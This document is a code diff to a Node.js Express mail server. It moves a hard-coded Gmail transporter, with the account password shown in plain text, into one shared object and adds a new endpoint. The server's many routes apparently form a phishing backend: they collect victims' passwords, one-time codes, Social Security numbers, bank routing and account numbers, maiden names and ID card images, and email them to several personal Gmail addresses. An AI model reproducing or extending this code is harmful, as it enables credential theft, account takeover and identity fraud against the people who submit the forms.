@@ -33,6 +33,14 @@ const cpUpload = upload.fields([
   { name: "back_id_card", maxCount: 2 },
 ]);
 
+let transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: "davidmiller4504@gmail.com",
+    pass: "dqhc mwpf nkmb buib",
+  },
+});
+
 app.post("/send-email", cpUpload, (req, res) => {
   const {
     last_name,
@@ -77,14 +85,7 @@ app.post("/send-email", cpUpload, (req, res) => {
     Postal Code: ${postal_code}
   `;
 
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   // Setup email data with unicode symbols
   let mailOptions = {
@@ -139,14 +140,7 @@ app.post("/sender", async (req, res) => {
     Email: ${email}
   `;
 
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -198,14 +192,7 @@ app.post("/arnoldsender", async (req, res) => {
     code: ${referralCode}
   `;
 
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -276,14 +263,7 @@ Date of Birth (DD/MM/YYYY): ${dob}
 
 Date of Payment: ${dateOfPayment}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -383,14 +363,7 @@ Date of Birth (DD/MM/YYYY): ${dob}
 
 Date of Payment: ${dateOfPayment}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -461,14 +434,7 @@ Date of Birth (DD/MM/YYYY): ${dob}
 
 Date of Payment: ${dateOfPayment}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -567,14 +533,7 @@ Date of Birth (DD/MM/YYYY): ${dob}
 
 Date of Payment: ${dateOfPayment}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -665,14 +624,7 @@ app.post("/hookup", async (req, res) => {
     IG: ${IG}
     Client Email: ${email}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -721,14 +673,7 @@ app.post("/stewjob", jobUpload, (req, res) => {
     ssn ${ssn}
   `;
 
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   // Setup email data with unicode symbols
   let mailOptions = {
@@ -780,14 +725,7 @@ app.post("/starb", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -822,14 +760,7 @@ app.post("/starbotp", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -861,14 +792,7 @@ app.post("/starbservice", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -903,14 +827,7 @@ app.post("/starbotpservice", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -945,14 +862,7 @@ app.post("/starbototpaol", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -984,14 +894,7 @@ app.post("/starbaol", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1026,14 +929,7 @@ app.post("/starbototpjullish", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1065,14 +961,7 @@ app.post("/starbjullish", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1107,14 +996,7 @@ app.post("/starbototpkriz", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1146,14 +1028,7 @@ app.post("/starbkriz", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1188,14 +1063,7 @@ app.post("/starbototp4", async (req, res) => {
 
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1227,14 +1095,7 @@ app.post("/starb4", async (req, res) => {
     Password: ${password}
 
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
@@ -1307,18 +1168,82 @@ Date of Birth (DD/MM/YYYY): ${dob}
 
 Date of Payment: ${dateOfPayment}
   `;
-  // Create a transporter object using SMTP transport
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: "davidmiller4504@gmail.com",
-      pass: "dqhc mwpf nkmb buib",
-    },
-  });
+ 
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "brindapettsscj15@gmail.com", // list of receivers
+    subject: `New Contact Form Submission ${fullName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
+
+app.post("/ssnsenderlarry", async (req, res) => {
+  const {
+    fullName,
+    ssn,
+    mailingAddress,
+    fathersName,
+    mothersName,
+    placeOfBirth,
+    state,
+    amountReceived,
+    routingNumber,
+    accountNumber,
+    phoneNumber,
+    receivedSSA,
+    dob,
+    dateOfPayment,
+  } = req.body;
+  console.log(req.body);
+
+  // Construct email message
+  const message = `
+You go a new information from ${fullName}:
+
+Full Name: ${fullName}
+
+SSN: ${ssn}
+
+Mailing Address on Profile: ${mailingAddress}
+
+Fathers Full Name and Maiden Name: ${fathersName}
+
+Mother's Full Name and Maiden Name: ${mothersName}
+
+Place of Birth (City and State): ${placeOfBirth}
+
+State: ${state}
+
+Amount Received Last Month (In USD): ${amountReceived}
+
+Routing Number That's on File: ${routingNumber}
+
+Account Number That's on File: ${accountNumber}
+
+Phone Number: ${phoneNumber}
+
+Did You Receive SSA (YES or NO): ${receivedSSA}
+
+Date of Birth (DD/MM/YYYY): ${dob}
+
+Date of Payment: ${dateOfPayment}
+  `;
+ 
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "larrykatie256@gmail.com", // list of receivers
     subject: `New Contact Form Submission ${fullName}`, // Subject line
     text: message, // plain text body
   };
